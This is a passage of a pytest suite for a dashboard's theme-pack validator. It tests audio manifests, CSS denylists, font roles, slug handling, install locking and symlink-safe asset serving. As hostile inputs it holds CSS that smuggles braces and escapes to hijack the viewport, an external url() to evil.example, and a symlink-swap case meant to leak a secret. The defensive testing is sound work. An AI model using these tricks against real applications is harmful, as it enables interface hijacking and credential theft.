            tmp_path, {"triggers": {"message-sent": {"src": "audio/chime.mp3", "maxDuration": 2}}}
        )
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "exceeds cap" in err

    def test_src_outside_audio_dir_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(tmp_path, {"triggers": {"notification": {"src": "other/chime.mp3"}}})
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "invalid audio 'src'" in err

    def test_non_audio_magic_bytes_rejected(self, tmp_path: Path) -> None:
        d = self._audio_pack(
            tmp_path,
            {"triggers": {"notification": {"src": "audio/chime.mp3"}}},
            valid_audio=False,
        )
        desc, err = _validate_audio_manifest(d)
        assert desc is None and err is not None and "not a valid audio file" in err

    def test_legacy_version_sounds_tolerated(self, tmp_path: Path) -> None:
        # Older sample manifests carry {version, sounds}; unknown top-level keys
        # are tolerated and yield an empty trigger/ambient descriptor.
        d = self._audio_pack(tmp_path, {"version": 1, "sounds": {"x": "y"}})
        desc, err = _validate_audio_manifest(d)
        assert err is None
        assert desc == {"triggers": {}, "ambient": None}


class TestOverridesLayoutDenylist:
    """§4.2/§5.1 per-rule layout denylist with the decorative-pseudo exemption."""

    @pytest.mark.parametrize(
        "decls",
        [
            [("z-index", "10000")],
            [("display", "none")],
            [("pointer-events", "none")],
            [("position", "fixed"), ("inset", "0")],
        ],
    )
    def test_topbar_rule_rejected(self, decls: list) -> None:
        assert _overrides_layout_violation([".topbar"], decls) is not None

    def test_decorative_pseudo_exempt(self) -> None:
        # The decorative-scanline idiom on body::before/after must validate.
        decls = [("position", "fixed"), ("inset", "0"), ("pointer-events", "none")]
        assert _overrides_layout_violation(["body::before", "body::after"], decls) is None

    def test_zindex_exactly_9999_passes(self) -> None:
        assert _overrides_layout_violation([".topbar"], [("z-index", "9999")]) is None

    def test_integration_topbar_fixed_cover_rejected(self) -> None:
        assert _validate_overrides_css(".topbar{position:fixed;inset:0;}") is not None

    def test_integration_scanline_passes(self) -> None:
        assert (
            _validate_overrides_css("body::before{position:fixed;inset:0;pointer-events:none;}")
            is None
        )

    def test_brace_in_string_does_not_hide_violations(self) -> None:
        # A ``}`` inside a quoted value must NOT terminate the rule early; the
        # declarations after it (position:fixed;inset:0 + z-index) are still
        # parsed, so this viewport-hijacking rule is rejected.
        css = '.sidebar{content:"}";position:fixed;inset:0;z-index:99999}'
        assert _validate_overrides_css(css) is not None

    def test_legit_rule_with_brace_in_content_passes(self) -> None:
        # ``content:"}"`` with otherwise-safe declarations must not be
        # false-rejected by brace-blind parsing.
        assert _validate_overrides_css('.foo{content:"}";color:red}') is None

    def test_data_uri_url_with_braces_passes(self) -> None:
        # A data-URI in url() may legitimately contain ``{}``; on a decorative
        # pseudo the covering position:fixed is exempt, so the pack installs.
        css = (
            "body::before{content:'';position:fixed;inset:0;pointer-events:none;"
            'background:url("data:image/svg+xml,<svg>{}</svg>")}'
        )
        assert _validate_overrides_css(css) is None

    def test_semicolon_in_string_does_not_split_declarations(self) -> None:
        # A ``;`` inside a quoted value must stay part of that value and not be
        # mistaken for a declaration boundary — the trailing z-index is still
        # seen and rejected.
        css = '.bar{content:"a;b";z-index:12345}'
        assert _validate_overrides_css(css) is not None


class TestThemeAssetDescriptor:
    """The frontend descriptor surfaces manifest-declared placement/behaviour."""

    def test_declared_pack_surfaces_rich_shape(self, tmp_path: Path) -> None:
        manifest = {
            "level": 2,
            "name": "Bk",
            "branding": {"botName": "KarenClaw"},
            "fonts": [{"family": "Krabby Patty", "file": "krabby-patty.ttf"}],
            "overlays": [
                {
                    "id": "karen",
                    "src": "overlays/karen.html",
                    "position": "bottom-right",
                    "zIndex": 41,
                    "trigger": "continuous",
                }
            ],
            "topbar": {"dark": "topbar/dark.html", "height": "56px", "hideOnMobile": True},
        }
        d = _decl_pack(
            tmp_path,
            {
                "overlays/karen.html": "<div>k</div>",
                "topbar/dark.html": "<div>d</div>",
                "styles/fonts/krabby-patty.ttf": b"\x00\x01\x00\x00" + b"\x00" * 16,
                "audio/manifest.json": json.dumps(
                    {"triggers": {"notification": {"src": "audio/chime.mp3", "maxDuration": 2}}}
                ),
                "audio/chime.mp3": _VALID_MP3,
            },
        )
        desc = _theme_asset_descriptor(d, manifest, 2)
        # Overlays are objects carrying declared placement/behaviour.
        assert desc["overlays"][0]["position"] == "bottom-right"
        assert desc["overlays"][0]["zIndex"] == 41
        assert desc["overlays"][0]["trigger"] == "continuous"
        # Topbar height/hideOnMobile echo the manifest.
        assert desc["topbar"]["height"] == "56px"
        assert desc["topbar"]["hideOnMobile"] is True
        # Audio trigger map is parsed.
        assert "notification" in desc["audio"]["triggers"]
        # A .ttf font surfaces with format 'truetype'.
        assert desc["fonts"][0]["format"] == "truetype"

    def test_undeclared_pack_gets_default_placement(self, tmp_path: Path) -> None:
        d = _decl_pack(tmp_path, {"overlays/foo.html": "<div>f</div>"})
        desc = _theme_asset_descriptor(d, {"level": 2, "name": "U"}, 2)
        assert desc["overlays"][0]["position"] == _THEME_OVERLAY_DEFAULT_POSITION
        assert desc["overlays"][0]["zIndex"] == _THEME_OVERLAY_DEFAULT_ZINDEX


_TTF = b"\x00\x01\x00\x00" + b"\x00" * 16


class TestFontRoles:
    """A face carries the Font Family option it feeds, so a pack can ship a
    proportional AND a monospace font and each reaches its own option."""

    @staticmethod
    def _pack(tmp_path: Path, fonts: list[dict]) -> tuple[Path, dict]:
        files = {f"styles/fonts/{f['file']}": _TTF for f in fonts if "file" in f}
        return _decl_pack(tmp_path, files), {"level": 1, "name": "F", "fonts": fonts}

    def test_role_round_trips_for_both_roles(self, tmp_path: Path) -> None:
        d, manifest = self._pack(
            tmp_path,
            [
                {"family": "Manrope", "file": "sans.ttf", "role": "sans"},
                {"family": "Plex Mono", "file": "mono.ttf", "role": "mono"},
            ],
        )
        fonts = _theme_asset_descriptor(d, manifest, 1)["fonts"]
        assert [(f["family"], f["role"]) for f in fonts] == [
            ("Manrope", "sans"),
            ("Plex Mono", "mono"),
        ]

    def test_absent_role_defaults_to_sans(self, tmp_path: Path) -> None:
        # A pack authored before roles existed must keep its meaning: its face is
        # the proportional one, which is the only thing the old shape could be.
        d, manifest = self._pack(tmp_path, [{"family": "Manrope", "file": "sans.ttf"}])
        assert _theme_asset_descriptor(d, manifest, 1)["fonts"][0]["role"] == "sans"

    def test_unknown_role_falls_back_to_sans(self, tmp_path: Path) -> None:
        # Lenient like weight/style: a typo downgrades one face rather than
        # failing the whole install.
        d, manifest = self._pack(
            tmp_path, [{"family": "Manrope", "file": "sans.ttf", "role": "cursive"}]
        )
        assert _theme_asset_descriptor(d, manifest, 1)["fonts"][0]["role"] == "sans"

    @pytest.mark.parametrize("bad_role", [[], {}, 7, None, True, ["sans"]])
    def test_non_string_role_does_not_crash_the_descriptor(
        self, tmp_path: Path, bad_role: object
    ) -> None:
        # `role` is untrusted manifest JSON. An unhashable value tested against a
        # frozenset raises TypeError, and the descriptor is built by the
        # theme-detail route the dashboard calls for EVERY installed pack at boot
        # — so one malformed pack would take the whole theme list down, not just
        # itself. It must degrade to the default role instead.
        d, manifest = self._pack(
            tmp_path, [{"family": "Manrope", "file": "sans.ttf", "role": bad_role}]
        )
        assert _theme_asset_descriptor(d, manifest, 1)["fonts"][0]["role"] == "sans"

    def test_cap_admits_a_full_sans_set_plus_a_mono_pair(self, tmp_path: Path) -> None:
        # The cap has to clear both roles at once, or shipping a mono font costs a
        # sans weight and the type hierarchy silently loses a step.
        fonts = [
            {"family": "S", "file": f"s{w}.ttf", "weight": w, "role": "sans"}
            for w in (400, 500, 600, 700)
        ] + [
            {"family": "M", "file": f"m{w}.ttf", "weight": w, "role": "mono"}
            for w in (400, 500)
        ]
        d, manifest = self._pack(tmp_path, fonts)
        assert len(_theme_asset_descriptor(d, manifest, 1)["fonts"]) == 6


class TestFontRoleRejectedAtInstall:
    """A `fonts` entry whose `role` is neither "sans" nor "mono" is REFUSED at
    install (`installing=True`) instead of silently coercing to "sans".
    "monospace" (the CSS keyword) is the likeliest typo for exactly the role
    most likely to be mistyped, and `_theme_asset_descriptor`'s lenient
    coercion (covered by `TestFontRoles` above, which must keep passing
    unchanged) made the failure silent: the mono face renders as Sans while
    Mono keeps the built-in JetBrains Mono. Unlike that read path,
    `_validate_theme_dir` reads `theme.json` from disk, so these build a real
    on-disk pack rather than passing an in-memory manifest."""

    def _pack_with_font_role(self, tmp_path: Path, role: object) -> Path:
        d = tmp_path / "role-pack"
        d.mkdir(parents=True, exist_ok=True)
        _write(
            d / "theme.json",
            {
                "slug": "role-pack",
                "name": "Role Pack",
                "emoji": "🎨",
                "level": 1,
                "formatVersion": 1,
                "fonts": [{"family": "Manrope", "file": "sans.ttf", "role": role}],
            },
        )
        _write(d / "variables.json", _VALID_VARS)
        (d / "styles" / "fonts").mkdir(parents=True, exist_ok=True)
        (d / "styles" / "fonts" / "sans.ttf").write_bytes(_TTF)
        return d

    def test_unknown_role_rejected_at_install(self, tmp_path: Path) -> None:
        d = self._pack_with_font_role(tmp_path, "monospace")
        summary, err = _validate_theme_dir(d, installing=True)
        assert summary is None
        assert err is not None
        assert "Manrope" in err
        assert "monospace" in err
        assert "'sans' and 'mono'" in err

    def test_unknown_role_tolerated_on_re_read(self, tmp_path: Path) -> None:
        # The theme-detail route re-runs this validator for every installed
        # pack on read (installing=False, the default). A pack that predates
        # this rule -- or installed before a narrower rule existed -- must
        # keep loading there rather than 500ing and dropping out of the theme
        # map, mirroring the font-pin rule's own install-only enforcement.
        d = self._pack_with_font_role(tmp_path, "monospace")
        summary, err = _validate_theme_dir(d)
        assert err is None, err
        assert summary is not None

    @pytest.mark.parametrize("role", ["sans", "mono"])
    def test_valid_roles_accepted_at_install(self, tmp_path: Path, role: str) -> None:
        d = self._pack_with_font_role(tmp_path, role)
        summary, err = _validate_theme_dir(d, installing=True)
        assert err is None, err

    def test_absent_role_still_accepted_at_install(self, tmp_path: Path) -> None:
        # Absent is the deliberate default case (coerces to sans on read) --
        # not what this rule targets.
        d = tmp_path / "no-role-pack"
        d.mkdir()
        _write(
            d / "theme.json",
            {
                "slug": "no-role-pack",
                "name": "No Role",
                "emoji": "🎨",
                "level": 1,
                "formatVersion": 1,
                "fonts": [{"family": "Manrope", "file": "sans.ttf"}],
            },
        )
        _write(d / "variables.json", _VALID_VARS)
        (d / "styles" / "fonts").mkdir(parents=True)
        (d / "styles" / "fonts" / "sans.ttf").write_bytes(_TTF)
        summary, err = _validate_theme_dir(d, installing=True)
        assert err is None, err

    @pytest.mark.parametrize("bad_role", [[], {}, 7, True, ["sans"], None])
    def test_non_string_role_rejected_at_install_without_crashing(
        self, tmp_path: Path, bad_role: object
    ) -> None:
        # `role` is untrusted manifest JSON. Membership-testing an unhashable
        # value (a list, a dict) against the frozenset raises TypeError if the
        # isinstance guard is dropped -- this must return a clean error
        # instead of crashing the install handler. An explicit JSON `null`
        # (None) is a PRESENT non-string value: it is rejected like any other
        # bad role, distinct from the absent-role default case above.
        d = self._pack_with_font_role(tmp_path, bad_role)
        summary, err = _validate_theme_dir(d, installing=True)
        assert summary is None
        assert err is not None


class TestOverridesFontPin:
    """overrides.css must not pin the UI font: a pin lands below where the Font
    Family preference is applied, so Mono/System would stop working with nothing
    on screen explaining why. theme.json's role-tagged ``fonts`` list is the route."""

    @pytest.mark.parametrize(
        "css",
        [
            "body{--font-body:'X',sans-serif}",
            "body{--mono:'X',monospace}",
            "body{--theme-font-sans:'X',sans-serif}",
            "body{--theme-font-mono:'X',monospace}",
            "body{font-family:'X',sans-serif}",
            "body{font:400 .875rem/1.55 'X',sans-serif}",
            "body:lang(ja){font-family:'X',sans-serif}",
            'html{font-family:"X",sans-serif}',
            ':root{font-family:"X",sans-serif}',
            '[data-theme="custom-x-dark"] body{font-family:"X",sans-serif}',
            "BODY{FONT-FAMILY:'X',sans-serif}",
            # Escaped property names: a browser decodes these while tokenizing.
            "body{--font-b\\6f dy:'X',sans-serif}",
            "body{f\\6f nt:400 .875rem/1.55 'X',sans-serif}",
            # Uppercase escape: \\4F decodes to 'O', and standard property names
            # are ASCII case-insensitive, so the browser still applies `font`.
            "body{f\\4F nt:400 .875rem/1.55 'X',sans-serif}",
            # Escaped SELECTOR: a browser resolves b\\6f dy to body. The uppercase
            # form also exercises the lowercase pass — selectors arrive already
            # case-folded, so only an uppercase-producing escape reaches it.
            "b\\6f dy{font-family:'X',sans-serif}",
            "b\\4F dy{font-family:'X',sans-serif}",
        ],
    )
    def test_pins_are_rejected(self, css: str) -> None:
        err = _validate_overrides_css(css, enforce_font_pins=True)
        assert err is not None
        assert "theme.json" in err

    @pytest.mark.parametrize(
        "css",
        [
            "body{--font-body:'X',sans-serif}",
            "body{font:400 .875rem/1.55 'X',sans-serif}",
            "body{font-family:'X',sans-serif}",
        ],
    )
    def test_pins_are_tolerated_when_not_installing(self, css: str) -> None:
        # The read path re-validates an ALREADY-INSTALLED pack. A pack that
        # predates the font-pin rule installed legitimately, so failing it here
        # would turn the theme-detail route into a 500 and drop the pack out of
        # the theme map — losing its colours as well as its font. The runtime
        # scoper still drops the pin, so the preference stays protected.
        assert _validate_overrides_css(css) is None

    @pytest.mark.parametrize(
        "css",
        [
            ".topbar{font-family:'X',sans-serif}",
            ".topbar{font:600 12px/1.2 'X',sans-serif}",
            ".code-block{font-family:'X',monospace}",
            "button.primary{font-family:'X',sans-serif}",
            "body{background:#101010;color:#eee}",
            # The shorthand match must not swallow the other font-* longhands.
            "body{font-weight:500}",
            "body{font-size:15px}",
            "body{font-feature-settings:'ss01'}",
            # The word `font:` appearing inside a VALUE is not a declaration. The
            # check reads property names, so neither the decoded string nor a
            # semicolon inside one may fake one.
            'body{--label:" \\66 ont:"}',
            'body{content:"x;font:y";color:#eee}',
            "body::before{content:\"\";position:fixed;inset:0;pointer-events:none}",
        ],
    )
    def test_narrow_surfaces_and_non_font_rules_still_pass(self, css: str) -> None:
        # The rule must not over-reach: a face on ONE surface is legitimate
        # theming, and an unrelated body rule is untouched.
        assert _validate_overrides_css(css, enforce_font_pins=True) is None


class TestLegacyPinnedPackStillLoads:
    """A pack installed BEFORE the font-pin rule must keep loading.

    The theme-detail route re-runs ``_validate_theme_dir`` on every read of an
    installed pack and answers 500 when it fails, and the dashboard fetches that
    route for every installed theme at boot. Enforcing the font-pin rule on that
    path would therefore not merely revert such a pack's font — it would drop the
    pack out of the theme map entirely, colours included.
    """

    PIN = "body{--font-body:'Legacy',sans-serif}"

    def test_install_refuses_the_pin(self, tmp_path: Path) -> None:
        d = _make_tiered(tmp_path, level=1, extra={"styles/overrides.css": self.PIN})
        summary, err = _validate_theme_dir(d, installing=True)
        assert summary is None
        assert err is not None and "theme.json" in err

    def test_reading_the_same_pack_succeeds(self, tmp_path: Path) -> None:
        d = _make_tiered(tmp_path, level=1, extra={"styles/overrides.css": self.PIN})
        summary, err = _validate_theme_dir(d)
        assert err is None, f"read path must not reject a legacy pack: {err}"
        assert summary is not None
        # The colours still resolve, which is the part a 500 would have taken away.
        assert summary["dark"]["--bg"] == "#000000"

    def test_structural_checks_still_apply_on_the_read_path(self, tmp_path: Path) -> None:
        # Relaxing the font layer must not relax the security/layout layers: an
        # external url() in an installed pack stays a hard failure on every path.
        d = _make_tiered(
            tmp_path,
            level=1,
            extra={"styles/overrides.css": ".topbar{background:url('https://evil.example/x.png')}"},
        )
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "forbidden pattern" in err


class TestDeleteLock:
    """DELETE of an installed theme dir must serialize against a concurrent
    reinstall by acquiring the same per-slug install lock before rmtree
    (Codex HIGH: unlocked delete raced the stage→swap in _do_install)."""

    def test_delete_blocks_while_install_lock_held(self, tmp_path, monkeypatch):
        import asyncio
        import time
        import types

        import kiro_crew.dashboard.theme_validate as tv_mod
        from kiro_crew.dashboard.handlers import themes as themes_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        slug = "locktheme"
        dir_target = tv_mod._installed_theme_dir(slug)
        dir_target.mkdir(parents=True)
        (dir_target / "theme.json").write_text(
            '{"name": "Lock", "level": 0}', encoding="utf-8"
        )

        req = types.SimpleNamespace(method="DELETE", match_info={"slug": slug})

        # Simulate an in-flight reinstall holding the per-slug lock.
        lock = themes_mod._theme_install_lock(slug)
        lock.acquire()
        try:
            # The handler dispatches rmtree into an executor that must first
            # acquire the held lock, so the await never completes → TimeoutError.
            with pytest.raises(asyncio.TimeoutError):
                asyncio.run(
                    asyncio.wait_for(themes_mod.api_theme_detail(req), timeout=1.0)
                )
            # Blocked, not raced: the directory is still intact.
            assert dir_target.is_dir()
        finally:
            lock.release()

        # Once the lock is free, the already-dispatched remove proceeds.
        deadline = time.time() + 5.0
        while dir_target.exists() and time.time() < deadline:
            time.sleep(0.05)
        assert not dir_target.exists()


class TestServingReadNolink:
    """_resolve_theme_asset CHECKS the path but the route
    OPENED it later with a plain read — a swap-to-symlink in the window was
    followed (credential exfil via the asset endpoint). Serving reads now go
    through _read_theme_bytes_nolink (O_NOFOLLOW + containment)."""

    def _installed(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        d = tv_mod._installed_theme_dir("mypack")
        (d / "overlays").mkdir(parents=True)
        (d / "overlays" / "fx.html").write_text("<html>ok</html>", encoding="utf-8")
        return d

    def test_regular_asset_served(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from kiro_crew.dashboard.handlers.themes import _read_theme_bytes_nolink

        d = self._installed(tmp_path, monkeypatch)
        data = _read_theme_bytes_nolink("mypack", d / "overlays" / "fx.html")
        assert data == b"<html>ok</html>"

    def test_symlink_swapped_asset_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from kiro_crew.dashboard.handlers.themes import _read_theme_bytes_nolink

        d = self._installed(tmp_path, monkeypatch)
        secret = tmp_path / "secret.txt"
        secret.write_text("AKIA-SECRET", encoding="utf-8")
        target = d / "overlays" / "fx.html"
        target.unlink()
        try:
            target.symlink_to(secret)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        # The swap happened AFTER resolution; the nolink read must refuse it.
        assert _read_theme_bytes_nolink("mypack", target) is None


class TestCssParserCorpus:
    """Shared-corpus guard for the two theme-CSS parsers.

    The install-time denylist (``_validate_overrides_css``) and the runtime
    positive-selector scoper (useTheme.tsx) implement different models BY
    DESIGN; this corpus pins each parser's verdict on identical inputs so any
    future drift fails a test rather than a user. The vitest twin
    (``website/src/test/themeCssCorpus.test.tsx``) asserts the ``runtimeKeeps``
    column against the SAME fixture file.
    """

    @staticmethod
    def _corpus():
        corpus_path = Path(__file__).resolve().parent / "fixtures" / "theme_css_corpus.json"
        return json.loads(corpus_path.read_text(encoding="utf-8"))["cases"]

    def test_install_verdicts_match_corpus(self) -> None:
        from kiro_crew.dashboard.theme_validate import _validate_overrides_css

        mismatches = []
        for case in self._corpus():
            err = _validate_overrides_css(case["css"], enforce_font_pins=True)
            accepted = err is None
            if accepted != case["installAccepts"]:
                mismatches.append(f"{case['name']}: expected installAccepts={case['installAccepts']}, got {accepted} (err={err})")
        assert not mismatches, "\n".join(mismatches)

    def test_corpus_covers_both_verdict_kinds(self) -> None:
        # Guard the corpus itself: it must keep exercising accepts AND rejects,
        # and at least one documented divergence (install-accepts, runtime-drops).
        cases = self._corpus()
        assert any(c["installAccepts"] for c in cases)
        assert any(not c["installAccepts"] for c in cases)
        assert any(c["installAccepts"] and not c["runtimeKeeps"] for c in cases)


# ── _slugify_theme_name hash fallback ──────────────────────────────


def test_theme_slug_non_ascii_names_derive_distinct_stable_slugs() -> None:
    korean = _slugify_theme_name("\ub2e4\ud06c \ubaa8\ub4dc")
    russian = _slugify_theme_name("\u0442\u0451\u043c\u043d\u0430\u044f \u0442\u0435\u043c\u0430")
    assert korean.startswith("custom-")
    assert korean != russian
    assert korean == _slugify_theme_name("\ub2e4\ud06c \ubaa8\ub4dc")
    # The fallback stays filesystem-safe by the repo's own traversal guard.
    assert _safe_theme_slug(korean) == korean


def test_theme_slug_ascii_names_are_unchanged() -> None:
    assert _slugify_theme_name("Solarized Dark") == "solarized-dark"


class TestThemeSlugAsciiPart:
    """``_theme_slug_ascii_part`` is the exact hash-fallback predicate.

    Asking "did this slug come from the fallback?" by matching ``custom-<16 hex>``
    would misread a real ASCII name, so the install path asks whether the ASCII
    filter empties instead. These pin that the split is behaviour-preserving.
    """

    def test_empty_exactly_when_the_filter_strips_everything(self) -> None:
        assert tv_mod._theme_slug_ascii_part("\u4e3b\u9898") == ""
        assert tv_mod._theme_slug_ascii_part("!!!") == ""
        assert tv_mod._theme_slug_ascii_part("Solarized Dark") == "solarized-dark"

    def test_a_hex_shaped_ascii_name_is_not_mistaken_for_a_fallback(self) -> None:
        # Slugifies to custom-0123456789abcdef: same shape as the fallback, but
        # the ASCII part is non-empty, so continuity must never be considered.
        name = "Custom 0123456789abcdef"
        assert _slugify_theme_name(name) == "custom-0123456789abcdef"
        assert tv_mod._theme_slug_ascii_part(name) != ""

    def test_slugify_still_composes_the_two_branches(self) -> None:
        for name in ("Solarized Dark", "\u4e3b\u9898", "x", "---"):
            expected = tv_mod._theme_slug_ascii_part(name) or slug_hash_fallback(
                name, "custom"
            )
            assert _slugify_theme_name(name) == expected


class TestThemeIdentitySource:
    """The identity is the string the slug derives from: declared slug, else name."""

    def test_declared_slug_wins_over_name(self) -> None:
        assert tv_mod._theme_identity_source({"slug": "pinned", "name": "Other"}) == "pinned"

    def test_blank_or_non_string_slug_falls_back_to_name(self) -> None:
        assert tv_mod._theme_identity_source({"slug": "   ", "name": "N"}) == "N"
        assert tv_mod._theme_identity_source({"slug": 7, "name": "N"}) == "N"

    def test_total_against_a_manifest_with_no_usable_strings(self) -> None:
        assert tv_mod._theme_identity_source({}) == ""
        assert tv_mod._theme_identity_source({"name": 5}) == ""

    def test_validate_reports_the_identity_it_slugged(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path, name="\u4e3b\u9898")
        _write(d / "theme.json", {"name": "\u4e3b\u9898", "level": 0, "formatVersion": 1})
        summary, err = _validate_theme_dir(d)
        assert err is None and summary is not None
        assert summary["identity"] == "\u4e3b\u9898"
        assert summary["slug"] == _slugify_theme_name("\u4e3b\u9898")


# ── Legacy-custom/-pack continuity ──


_LEGACY_A = "\u4e3b\u9898"  # all non-ASCII: the ASCII filter empties it
_LEGACY_B = "\u30c6\u30fc\u30de"  # a DIFFERENT all-non-ASCII pack


def _legacy_pack(root: Path, name: str) -> Path:
    """A pack whose name filters to nothing, so its slug is a hash fallback."""
    root.mkdir(parents=True, exist_ok=True)
    _write(root / "theme.json", {"name": name, "emoji": "x", "level": 0, "formatVersion": 1})
    _write(root / "variables.json", _VALID_VARS)
    return root


class TestLegacyCustomPackContinuity:
    """An installed pack whose name filters to nothing sits under the constant
    slug ``custom``. Reinstalling it must keep addressing that directory instead
    of forking a hashed twin -- and must only do so while the directory still
    holds THAT pack, decided inside the lock guarding it."""

    def _setup(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        return tv_mod._themes_dir()

    def test_reinstall_keeps_the_legacy_slug(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        themes = self._setup(tmp_path, monkeypatch)
        _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_A)
        src = _legacy_pack(tmp_path / "src" / "pack", _LEGACY_A)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == "custom"
        # No hashed twin: the legacy directory is the only record.
        assert sorted(p.name for p in themes.iterdir() if p.is_dir()) == ["custom"]

    def test_a_different_pack_at_the_legacy_slug_is_not_adopted(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        themes = self._setup(tmp_path, monkeypatch)
        legacy = _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_B)
        src = _legacy_pack(tmp_path / "src" / "pack", _LEGACY_A)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == _slugify_theme_name(_LEGACY_A)
        # The unrelated pack is untouched, not overwritten.
        assert json.loads((legacy / "theme.json").read_text("utf-8"))["name"] == _LEGACY_B
        assert len([p for p in themes.iterdir() if p.is_dir()]) == 2

    def test_no_legacy_directory_derives_the_hashed_slug(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._setup(tmp_path, monkeypatch)
        src = _legacy_pack(tmp_path / "src" / "pack", _LEGACY_A)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == _slugify_theme_name(_LEGACY_A)

    def test_an_ascii_named_pack_never_consults_continuity(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        themes = self._setup(tmp_path, monkeypatch)
        _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_A)
        src = _make_theme(tmp_path / "src")  # slug "lcars", ASCII survives

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == "lcars"
        assert (themes / "custom" / "theme.json").is_file()

    def test_an_editor_record_on_the_legacy_slug_forks_instead_of_failing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # A custom.json record owns the slug, so continuity is impossible. The
        # install must fall back to the hashed slug, NOT return 409: forking is
        # exactly the behaviour that shipped before continuity existed.
        themes = self._setup(tmp_path, monkeypatch)
        _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_A)
        themes.mkdir(parents=True, exist_ok=True)
        _write(themes / "custom.json", {"name": "editor", "slug": "custom"})
        src = _legacy_pack(tmp_path / "src" / "pack", _LEGACY_A)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == _slugify_theme_name(_LEGACY_A)
        assert json.loads((themes / "custom.json").read_text("utf-8"))["name"] == "editor"

    def test_reinstalling_the_legacy_directory_itself_forks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # src IS themes/custom: adopting it would rename the directory onto
        # itself, so continuity declines and the derived slug takes the copy.
        self._setup(tmp_path, monkeypatch)
        legacy = _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_A)

        theme, err, status = th_mod._do_install("local", {"path": str(legacy)})

        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == _slugify_theme_name(_LEGACY_A)
        assert legacy.is_dir()

    def test_a_source_nested_under_the_legacy_directory_forks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # A local source is allowed to sit UNDER the themes dir, so it can sit
        # inside themes/custom itself. Adopting that target would displace the
        # source's own ancestor and rmtree it, deleting the source and any
        # sibling content. Continuity must decline and the derived slug takes
        # the staged copy.
        self._setup(tmp_path, monkeypatch)
        legacy = _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_A)
        src = _legacy_pack(legacy / "subpack", _LEGACY_A)
        sibling = legacy / "keepme.txt"
        sibling.write_text("sibling content", encoding="utf-8")

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == _slugify_theme_name(_LEGACY_A)
        assert src.is_dir()
        assert sibling.read_text("utf-8") == "sibling content"

    def test_identity_is_resolved_inside_the_legacy_promotion_lock(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The load-bearing test.

        The identity read and the directory replacement must be ONE critical
        section under ``_theme_install_lock("custom")``. Resolving identity
        before that lock (for example during validation, or under the DERIVED
        slug's lock) leaves a window in which a concurrent install can place a
        different pack at ``themes/custom``; the first install, still holding a
        now-stale match, would delete it and return 200.

        The test holds the legacy lock and, while holding it, performs exactly
        the mutation that lock admits -- swapping in a different pack. If the
        install resolved identity inside the lock it observes the swap and
        declines continuity; if it resolved identity earlier it destroys the
        victim. The victim's survival is the discriminating assertion: blocking
        alone proves nothing, because the swap is under the lock either way.
        """
        themes = self._setup(tmp_path, monkeypatch)
        legacy = _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_A)
        src = _legacy_pack(tmp_path / "src" / "pack", _LEGACY_A)

        result: dict[str, object] = {}

        def _install() -> None:
            result["out"] = th_mod._do_install("local", {"path": str(src)})

        lock = th_mod._theme_install_lock("custom")
        lock.acquire()
        worker = threading.Thread(target=_install, daemon=True)
        worker.start()
        try:
            # Cannot reach its decision while the lock is held.
            worker.join(timeout=2.0)
            assert worker.is_alive() and "out" not in result
            # Stand in for a concurrent install that promoted a DIFFERENT pack.
            shutil.rmtree(legacy)
            _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_B)
        finally:
            lock.release()

        worker.join(timeout=30.0)
        assert not worker.is_alive()
        theme, err, status = result["out"]  # type: ignore[misc]
        assert (status, err) == (200, None)
        # Read the identity under the lock -> the pack is a different one -> fork.
        assert theme is not None and theme["slug"] == _slugify_theme_name(_LEGACY_A)
        # The victim survives: no silent data loss of unrelated content.
        assert json.loads((legacy / "theme.json").read_text("utf-8"))["name"] == _LEGACY_B
        assert tv_mod._installed_theme_dir(_slugify_theme_name(_LEGACY_A)).is_dir()
        assert list(themes.glob(".install-staging-*")) == []
        assert list(themes.glob(".custom.old-*")) == []


class TestInstalledThemeIdentityRead:
    """``_installed_theme_identity`` is total: every unreadable shape reads as
